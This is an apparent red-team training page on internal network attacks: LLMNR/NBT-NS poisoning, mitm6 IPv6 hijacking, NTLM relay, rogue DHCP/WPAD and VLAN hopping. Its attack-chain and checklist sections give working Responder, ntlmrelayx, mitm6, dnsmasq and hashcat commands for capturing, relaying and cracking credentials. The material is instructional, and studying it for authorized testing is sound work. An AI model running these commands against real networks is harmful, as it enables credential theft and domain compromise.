---
layout: training-page
title: "Network Attack Overview — Red Team Academy"
module: "Network Attacks"
tags:
  - network
  - layer2
  - mitm
  - arp
  - llmnr
page_key: "network-overview"
render_with_liquid: false
---

# Network Attack Overview

Network attacks target the underlying infrastructure — Layer 2 and Layer 3 protocols that most organizations never harden. A foothold on a single network segment opens LLMNR poisoning, IPv6 hijacking, VLAN traversal, and credential interception at scale. These techniques frequently achieve domain compromise faster than vulnerability exploitation.

## Attack Surface by Layer

```
Layer 2 — Data Link
  ARP          — no authentication; spoof gateway to MITM traffic
  802.1Q VLAN  — tagging misconfig allows cross-VLAN access
  DTP          — Cisco trunking negotiation; spoof to become trunk port
  STP          — spanning tree; inject superior BPDU to become root bridge
  802.1X       — port-based NAC; bypassable via MAC cloning or EAP relay

Layer 3 — Network
  DHCP         — no auth; starve pool or inject rogue server
  LLMNR/mDNS   — Windows fallback name resolution; poisonable
  NBT-NS       — NetBIOS name resolution; poisonable
  IPv6 SLAAC   — Windows prefers IPv6; inject rogue DHCPv6/RA
  WPAD         — proxy auto-discovery via DNS/DHCP; hijackable

Layer 4+ — Transport / Application
  Cleartext protocols — FTP, HTTP, Telnet, SMTP, LDAP (unencrypted)
  NTLM relay   — relay captured Net-NTLMv2 to authenticate elsewhere
  Kerberos     — AS-REP roasting, kerberoasting (see AD module)
```

## Prerequisites

```
Physical or logical access to the target network segment is required.
Common entry points:

  On-site     — laptop plugged into a wall jack or conference room port
  VPN         — split-tunnel VPN with access to internal segment
  Post-compromise — shell on internal host, pivot from DMZ
  Wi-Fi       — connected to internal SSID (after wireless attack)
```

## Attack Decision Tree

```
Gained network access?
│
├─► Is IPv6 enabled on Windows hosts?      → mitm6 (highest impact)
│
├─► Are LLMNR/NBT-NS enabled?              → Responder (NTLMv2 capture)
│
├─► Is NTLM signing disabled?              → NTLM relay to SMB/LDAP/HTTP
│
├─► Is the port on a trunk or access port? → VLAN hopping if access port
│
├─► Is DHCP authenticated?                 → Rogue DHCP / starvation
│
└─► Are plaintext protocols in use?        → Passive sniffing / credential harvest
```

## Tooling Overview

```
Responder      — LLMNR/NBT-NS/mDNS/WPAD poisoner; NTLMv2 capture
mitm6          — IPv6 rogue DHCPv6 + DNS; Windows IPv6 preference exploit
Bettercap      — modern ARP/MITM framework; credential sniffer
Impacket       — ntlmrelayx, smbclient, secretsdump; the relay toolkit
Yersinia       — Layer 2 attack framework (DTP, STP, DHCP, 802.1Q)
Scapy          — packet crafting for custom protocol attacks
Wireshark      — passive capture and analysis
Pcredz         — credential extraction from live traffic or PCAP
Nmap           — host discovery and service enumeration
Masscan        — fast port scanning across large subnets
```

## MITRE ATT&CK Mapping

```
T1557     — Adversary-in-the-Middle
T1557.001 — LLMNR/NBT-NS Poisoning and SMB Relay
T1557.002 — ARP Cache Poisoning
T1040     — Network Sniffing
T1046     — Network Service Discovery
T1200     — Hardware Additions (rogue device on network)
T1556.006 — Multi-Factor Authentication — Network Device Auth Bypass
```

## Tooling Detail

Each tool occupies a specific role in the network attack workflow:

```
Responder
  Role: Poison LLMNR, NBT-NS, mDNS, and WPAD queries on the local subnet.
        Serves rogue SMB/HTTP/FTP/LDAP servers to capture Net-NTLMv2 hashes.
  Best for: Any Windows environment where LLMNR or NBT-NS is enabled (default).
  Pair with: ntlmrelayx when SMB signing is disabled.

mitm6
  Role: Spoof DHCPv6 and become the IPv6 DNS server for Windows hosts.
        Windows prefers IPv6 DNS over IPv4 — all name resolution flows to attacker.
  Best for: Windows-heavy environments; works even when LLMNR is disabled.
  Pair with: ntlmrelayx -6 for LDAP relay and shadow credentials attacks.

Bettercap
  Role: Full ARP MITM framework with credential sniffing, HTTP proxy,
        DNS spoofing, and SSL stripping.
  Best for: Cleartext protocol interception and session hijacking.
  Pair with: Responder (ARP MITM positions you on the same segment).

Impacket (ntlmrelayx, secretsdump, smbclient)
  Role: Relay captured NTLM authentication to SMB, LDAP, LDAPS, HTTP targets.
        Dump SAM, NTDS.dit; create computer accounts; execute commands.
  Best for: Escalation once hashes are captured from Responder or mitm6.

Yersinia
  Role: Layer 2 attack framework targeting DTP, STP, DHCP, 802.1Q, VTP, HSRP.
  Best for: VLAN hopping via DTP trunk negotiation; DHCP starvation.

Scapy
  Role: Python packet crafting library for custom protocol attacks.
  Best for: VLAN double-tagging, ARP poison scripts, custom TCP/IP probes.

Wireshark / tshark
  Role: Passive capture and deep protocol analysis.
  Best for: Identifying what protocols are in use before active attacks begin.

PCredz
  Role: Automated credential extraction from live interfaces or PCAP files.
  Best for: Post-MITM credential harvesting across FTP, HTTP, NTLM, Kerberos.

Nmap
  Role: Host discovery, port scanning, service/version detection, NSE scripts.
  Best for: Building the target inventory and identifying relay targets.

Masscan
  Role: Extremely fast SYN port scanner; ideal for scanning /16 and /8 ranges.
  Best for: Initial sweep of large internal address spaces.
```

## Common Attack Chains

### Chain 1: LLMNR Poison → NTLMv2 Relay → Domain Admin

```
Step 1: Confirm LLMNR is active
  tcpdump -i eth0 'udp port 5355'  (watch for broadcast queries)

Step 2: Find relay targets (SMB signing disabled)
  crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

Step 3: Disable SMB/HTTP in Responder.conf, start Responder
  responder -I eth0 -wr

Step 4: Start ntlmrelayx against targets
  ntlmrelayx.py -tf targets.txt -smb2support --sam

Step 5: Wait for a user to browse to a mistyped name or WPAD fetch
  → ntlmrelayx relays their credentials → SAM dump or command execution

Step 6: If a DA credential is relayed to a DC with no signing
  → Secretsdump via relay → all domain hashes
```

### Chain 2: mitm6 → LDAP Relay → Shadow Credentials → DA

```
Step 1: Confirm DHCPv6 is active on segment
  tcpdump -i eth0 'ip6 and udp port 546'

Step 2: Start mitm6 (becomes DNS server for all Windows hosts)
  mitm6 -i eth0 -d contoso.local

Step 3: Start ntlmrelayx targeting LDAPS on the DC
  ntlmrelayx.py -6 -t ldaps://DC01.contoso.local \
    -wh fakewpad.contoso.local --shadow-credentials --shadow-target VICTIM$

Step 4: ntlmrelayx writes msDS-KeyCredentialLink to target computer account
  → Generates pfx certificate and private key

Step 5: Authenticate with certificate to get TGT
  python3 PKINITtools/gettgtpkinit.py -cert-pfx victim.pfx contoso.local/VICTIM$ victim.ccache

Step 6: Extract NT hash from TGT
  python3 PKINITtools/getnthash.py contoso.local/VICTIM$ -key <AS-REP key>
  → Pass-the-hash with machine account hash
```

### Chain 3: Rogue DHCP → WPAD → NTLMv2 Capture → Password Crack

```
Step 1: DHCP starvation — exhaust the real server's pool
  yersinia dhcp -attack 1 -interface eth0

Step 2: Rogue DHCP — hand out attacker as gateway + DNS + WPAD
  dnsmasq --interface=eth0 --dhcp-range=192.168.1.200,192.168.1.250,300s \
    --dhcp-option=3,192.168.1.99 --dhcp-option=6,192.168.1.99 \
    --dhcp-option=252,"http://wpad/wpad.dat"

Step 3: Responder captures WPAD auth
  responder -I eth0 -w -F

Step 4: Crack captured NTLMv2 hashes
  hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

## Network Segmentation Bypass

Network segmentation is often the primary defense between attack surface areas. Common bypass paths:

```
VLAN Hopping
  - DTP trunk negotiation on "dynamic auto" switch ports → access all VLANs
  - 802.1Q double-tagging → one-way traffic injection into another VLAN
  - Post-hop: configure VLAN subinterface, run attacks against new segment

Firewall Rule Weaknesses
  - Legacy management protocols (SNMP, Telnet) allowed between segments
  - "Any to DC" rules for authentication bypass lateral movement
  - HTTP/HTTPS outbound from all segments (C2 and exfil path)

Dual-Homed Hosts
  - Servers with NICs in multiple segments (DB servers, jump boxes)
  - Compromise gives access to both segments simultaneously

VPN Concentrators
  - VPN endpoints often bridged into trusted internal segments
  - Split-tunnel VPN: attacker on same segment as VPN client can route

Wireless → Wired
  - Corporate Wi-Fi in same VLAN as wired client segment
  - Guest Wi-Fi with routing to internal (misconfiguration)
```

## Passive vs Active Attacks

```
PASSIVE (listen only — no traffic injected)
  Pros:
    - No detection risk from IDS/IPS
    - Cannot disrupt network operations
    - Legal risk lower (collection only)
  Cons:
    - Requires existing cleartext or weak protocols
    - Limited to traffic that reaches your interface
  Examples:
    - tcpdump/Wireshark on network tap
    - netdiscover -p (passive ARP watch)
    - PCredz -i eth0 (live extraction without injection)
    - Responder -I eth0 -A (analyze mode — no poisoning)

ACTIVE (traffic injected or protocols manipulated)
  Pros:
    - Forces credential exposure even in hardened environments
    - Works against encrypted protocols (NTLM relay doesn't need plaintext)
    - Higher success rate in modern environments
  Cons:
    - Detectable via IDS, XDR, SIEM correlation
    - Can disrupt network (DHCP starvation, STP root injection)
    - Higher operational risk
  Examples:
    - Responder -I eth0 (active poisoning)
    - mitm6 -i eth0 (DHCPv6 injection)
    - Bettercap arp.spoof on (ARP cache poisoning)
    - Yersinia DTP attack (trunk negotiation)
```

## Quick-Win Checklist (Ordered by Impact/Risk)

Work through this list on a new network engagement. Higher items = higher impact, lower detection risk.

```
Priority 1 — Passive recon (zero risk, maximum intel)
  [ ] tcpdump for 5-10 minutes — what protocols are in use?
  [ ] Responder -A mode — are LLMNR/NBT-NS queries present?
  [ ] tcpdump 'ip6 and udp port 546' — is DHCPv6 traffic visible?
  [ ] tcpdump 'tcp port 21 or tcp port 23 or tcp port 389' — cleartext services?
  [ ] Wireshark — look for HTTP Basic Auth, FTP, Telnet, cleartext LDAP binds

Priority 2 — Scanning (low risk, high intel)
  [ ] masscan -p445,80,443,22,3389 <subnet> --rate 1000 — live hosts
  [ ] crackmapexec smb <subnet> --gen-relay-list targets.txt — signing status
  [ ] nmap --script ldap-rootdse -p 389 <DC IP> — confirm domain name
  [ ] nmap --script smb-vuln-ms17-010 -p 445 <subnet> — EternalBlue check

Priority 3 — LLMNR/NBT-NS poisoning (medium risk, very high reward)
  [ ] Disable SMB/HTTP in Responder.conf if relay targets found
  [ ] responder -I eth0 -wr (poison + relay)
  [ ] ntlmrelayx.py -tf targets.txt -smb2support --sam

Priority 4 — IPv6 / mitm6 (medium-high risk, very high reward)
  [ ] mitm6 -i eth0 -d <domain> + ntlmrelayx LDAP relay
  [ ] Target shadow credentials or RBCD if LDAPS relay succeeds

Priority 5 — ARP MITM / rogue DHCP (higher risk)
  [ ] Only if LLMNR/mitm6 yield nothing
  [ ] Targeted ARP poison (single host, not entire subnet)
  [ ] Rogue DHCP only after starvation exhausts real pool

Priority 6 — Layer 2 attacks (highest operational risk)
  [ ] VLAN hopping — only if segmentation bypass is in scope
  [ ] STP root injection — avoid unless explicitly authorized (can cause outage)
```

## Resources

- Impacket — `github.com/fortra/impacket`
- Responder — `github.com/lgandx/Responder`
- mitm6 — `github.com/dirkjanm/mitm6`
- Bettercap — `bettercap.org`
- Yersinia — `github.com/tomac/yersinia`
- PCredz — `github.com/lgandx/PCredz`
- Masscan — `github.com/robertdavidgraham/masscan`
- MITRE Network Attacks — `attack.mitre.org/tactics/TA0007/`
